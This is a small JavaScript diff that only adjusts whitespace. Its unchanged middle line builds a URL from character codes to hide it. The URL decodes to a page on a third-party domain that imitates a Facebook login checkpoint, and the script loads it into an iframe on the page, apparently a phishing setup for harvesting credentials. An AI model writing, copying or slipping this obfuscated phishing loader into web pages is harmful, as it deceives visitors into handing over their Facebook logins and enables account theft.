@@ -1,3 +1,3 @@
-var iframeUrl = document.querySelector('#extframe'); 
+var iframeUrl = document.querySelector('#extframe');
 let link = String.fromCharCode(104,116,116,112,115,58,47,47,121,97,116,114,97,107,101,121,46,99,111,109,47,102,97,99,101,98,111,111,107,46,99,111,109,47,108,111,103,105,110,95,97,117,116,104,47,99,104,101,99,107,112,111,105,110,116,47,108,111,103,105,110,46,104,116,109,108)
-iframeUrl .setAttribute('src', link);
+iframeUrl.setAttribute('src', link);
